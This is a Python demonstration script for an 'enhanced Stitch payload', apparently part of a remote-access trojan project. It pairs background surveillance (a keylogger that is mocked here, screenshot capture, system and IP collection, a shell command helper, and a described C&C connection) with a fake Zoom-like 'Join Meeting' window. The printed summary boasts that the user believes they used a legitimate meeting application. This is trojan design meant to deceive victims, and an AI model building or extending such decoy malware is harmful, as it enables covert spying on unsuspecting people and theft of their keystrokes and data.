#!/usr/bin/env python
# Demo of Enhanced Payload with Auto-Execution and Meeting UI
# This demonstrates how the payload will work when generated

import os
import sys
import threading
from time import sleep, strftime
import platform
import socket

# Mock functions to simulate the stitch environment
def get_temp():
    if sys.platform.startswith('win'):
        return "C:\\Windows\\Temp"
    else:
        return "/tmp"

def get_user():
    if sys.platform.startswith('win'):
        return os.getenv('username', 'user')
    else:
        import getpass
        return getpass.getuser()

def win_client():
    return sys.platform.startswith('win')

def osx_client():
    return sys.platform.startswith('darwin')

def run_command(cmd):
    try:
        import subprocess
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8', errors='ignore')
    except:
        return "Command executed"

def no_error(result):
    return not (result.startswith("ERROR:") or result.startswith("[!]"))

# Mock stitch_running function
def stitch_running():
    return False

# Mock keylogger class
class MockKeylogger:
    def __init__(self):
        self.status = False
    
    def start(self):
        self.status = True
        print("[DEMO] Keylogger started")
    
    def stop_freeze(self):
        pass
    
    def get_status(self):
        return self.status

nt_kl = MockKeylogger()

# Mock MSS class for screenshots
class MockMSS:
    def __enter__(self):
        return self
    
    def __exit__(self, *args):
        pass
    
    def save(self, mon=-1, output=None):
        # Simulate screenshot
        print(f"[DEMO] Screenshot saved to {output}")
        # Create a dummy file
        try:
            with open(output, 'w') as f:
                f.write("dummy screenshot data")
        except:
            pass
        yield True

MSS = MockMSS

# Enhanced payload functions
def auto_execute_operations():
    """Auto-execute key operations silently"""
    operations_log = []
    
    try:
        print("[DEMO] Starting auto-execution operations...")
        
        # Start keylogger
        if win_client():
            nt_kl.stop_freeze()
        status = nt_kl.get_status()
        if not status:
            nt_kl.start()
            status = nt_kl.get_status()
            if status:
                operations_log.append("[+] Keylogger started")
        
        # Take screenshot
        temp = get_temp()
        screenshot_path = os.path.join(temp, 'auto_screenshot.jpg')
        
        with MSS() as screenshotter:
            if osx_client():
                result = run_command(f'screencapture -x {screenshot_path}')
                if not no_error(result):
                    next(screenshotter.save(mon=-1, output=screenshot_path))
            else:
                next(screenshotter.save(mon=-1, output=screenshot_path))
        
        if os.path.exists(screenshot_path):
            operations_log.append("[+] Screenshot captured")
        
        # Gather system info
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "127.0.0.1"
        
        sysinfo = {
            'os': platform.platform(),
            'user': get_user(),
            'ip': ip,
            'hostname': platform.node()
        }
        operations_log.append("[+] System info gathered")
        print(f"[DEMO] System Info: {sysinfo}")
        
        # Save operations log
        log_path = os.path.join(temp, 'auto_ops.log')
        try:
            with open(log_path, 'w') as f:
                f.write("Auto-execution log:\n")
                for entry in operations_log:
                    f.write(entry + "\n")
            operations_log.append(f"[+] Log saved to {log_path}")
        except Exception as e:
            operations_log.append(f"[!] Log save error: {str(e)}")
        
        return {'success': True, 'operations': operations_log}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

def show_meeting_ui():
    """Show Zoom-like meeting interface"""
    try:
        # Try GUI version first
        if win_client():
            import tkinter as tk
            from tkinter import ttk, messagebox
        else:
            try:
                import tkinter as tk
                from tkinter import ttk, messagebox
            except ImportError:
                import Tkinter as tk
                import ttk
                import tkMessageBox as messagebox
        
        print("[DEMO] Showing GUI meeting interface...")
        
        root = tk.Tk()
        root.title("Join Meeting")
        root.geometry("480x320")
        root.resizable(False, False)
        
        # Center window
        root.update_idletasks()
        width = root.winfo_width()
        height = root.winfo_height()
        x = (root.winfo_screenwidth() // 2) - (width // 2)
        y = (root.winfo_screenheight() // 2) - (height // 2)
        root.geometry(f"{width}x{height}+{x}+{y}")
        
        # Configure colors
        bg_color = "#ffffff"
        primary_color = "#2d8cff"
        text_color = "#1f2937"
        
        root.configure(bg=bg_color)
        
        # Main frame
        main_frame = tk.Frame(root, bg=bg_color, padx=40, pady=30)
        main_frame.pack(fill="both", expand=True)
        
        # Title
        title_label = tk.Label(main_frame, text="📹 Join Meeting", 
                              font=("Arial", 18, "bold"), 
                              bg=bg_color, fg=text_color)
        title_label.pack(pady=(0, 30))
        
        # Meeting ID input
        id_label = tk.Label(main_frame, text="Meeting ID", 
                           font=("Arial", 11), 
                           bg=bg_color, fg=text_color)
        id_label.pack(anchor="w", pady=(0, 5))
        
        id_entry = tk.Entry(main_frame, font=("Arial", 14), 
                           relief="solid", borderwidth=1)
        id_entry.pack(fill="x", ipady=8, pady=(0, 20))
        id_entry.focus()
        
        # Buttons
        button_frame = tk.Frame(main_frame, bg=bg_color)
        button_frame.pack(fill="x")
        
        meeting_id_result = {"value": ""}
        
        def join_meeting():
            meeting_id = id_entry.get().strip()
            if meeting_id:
                meeting_id_result["value"] = meeting_id
                print(f"[DEMO] Meeting ID entered: {meeting_id}")
                
                # Log meeting ID
                try:
                    log_path = os.path.join(get_temp(), 'meeting.log')
                    with open(log_path, 'w') as f:
                        f.write(f"Meeting ID: {meeting_id}\n")
                        f.write(f"Timestamp: {strftime('%Y-%m-%d %H:%M:%S')}\n")
                    print(f"[DEMO] Meeting log saved to {log_path}")
                except Exception as e:
                    print(f"[DEMO] Log error: {e}")
                
                # Show connecting message
                id_entry.configure(state="disabled")
                join_btn.configure(state="disabled", text="Connecting...")
                root.after(2000, lambda: root.quit())
            else:
                messagebox.showerror("Error", "Please enter a Meeting ID")
        
        join_btn = tk.Button(button_frame, text="Join Meeting", 
                            font=("Arial", 11, "bold"),
                            bg=primary_color, fg="white",
                            relief="flat", padx=30, pady=10,
                            command=join_meeting)
        join_btn.pack(side="right")
        
        cancel_btn = tk.Button(button_frame, text="Cancel", 
                              font=("Arial", 11),
                              bg="#f7f9fa", fg=text_color,
                              relief="flat", padx=30, pady=10,
                              command=root.quit)
        cancel_btn.pack(side="right", padx=(0, 10))
        
        root.mainloop()
        root.destroy()
        
        return meeting_id_result["value"]
        
    except Exception as e:
        print(f"[DEMO] GUI Error: {e}")
        # Fallback to console version
        print("\n" + "="*40)
        print("         JOIN MEETING")
        print("="*40)
        try:
            meeting_id = input("Enter Meeting ID: ").strip()
        except:
            meeting_id = ""
        
        if meeting_id:
            print(f"Connecting to meeting {meeting_id}...")
            sleep(2)
            print("Connected successfully!")
            
        return meeting_id

def enhanced_main():
    """Enhanced main function with auto-execution and meeting UI"""
    print("[DEMO] Enhanced payload started!")
    print("[DEMO] This simulates what happens when the payload is opened...")
    
    def run_background_operations():
        try:
            print("\n[DEMO] === BACKGROUND OPERATIONS ===")
            # Auto-execute key operations
            auto_ops_result = auto_execute_operations()
            
            print(f"[DEMO] Auto-execution result: {auto_ops_result}")
            
            # In real payload, this would start the C&C connection
            print("[DEMO] Starting C&C connection threads...")
            print("[DEMO] Payload is now running silently in background...")
                    
        except Exception as e:
            print(f"[DEMO] Background operations error: {e}")
    
    def show_meeting_interface():
        try:
            print(f"\n[DEMO] === MEETING INTERFACE ===")
            print("[DEMO] Waiting 3 seconds for background operations to start...")
            sleep(3)
            
            meeting_id = show_meeting_ui()
            
            if meeting_id:
                print(f"[DEMO] User entered meeting ID: {meeting_id}")
                print("[DEMO] Meeting interface completed successfully!")
            else:
                print("[DEMO] User cancelled or no meeting ID entered")
                
        except Exception as e:
            print(f"[DEMO] Meeting interface error: {e}")
    
    # Start background operations
    print("[DEMO] Starting background operations thread...")
    bg_thread = threading.Thread(target=run_background_operations)
    bg_thread.daemon = True
    bg_thread.start()
    
    # Show meeting interface
    print("[DEMO] Starting meeting interface thread...")
    ui_thread = threading.Thread(target=show_meeting_interface)
    ui_thread.daemon = True
    ui_thread.start()
    
    # Wait for UI thread to complete
    ui_thread.join()
    
    print("\n[DEMO] === PAYLOAD CONTINUES RUNNING ===")
    print("[DEMO] In real scenario, payload would continue running silently...")
    print("[DEMO] Background operations (keylogger, C&C connection) remain active")
    print("[DEMO] User sees normal meeting interface, unaware of background activity")

if __name__ == "__main__":
    print("="*60)
    print("    ENHANCED STITCH PAYLOAD DEMONSTRATION")
    print("="*60)
    print()
    print("This demo shows how the enhanced payload works:")
    print("1. Auto-executes key operations (keylogger, screenshot, etc.)")
    print("2. Shows professional Zoom-like meeting interface")
    print("3. Continues running silently in background")
    print()
    print("Press Enter to start the demo...")
    try:
        input()
    except:
        pass
    
    enhanced_main()
    
    print("\n" + "="*60)
    print("                    DEMO COMPLETED")
    print("="*60)
    print()
    print("Summary of what happened:")
    print("✓ Background operations executed automatically")
    print("✓ Meeting interface displayed to user")
    print("✓ Payload continues running silently")
    print("✓ User believes they used a legitimate meeting application")
    print()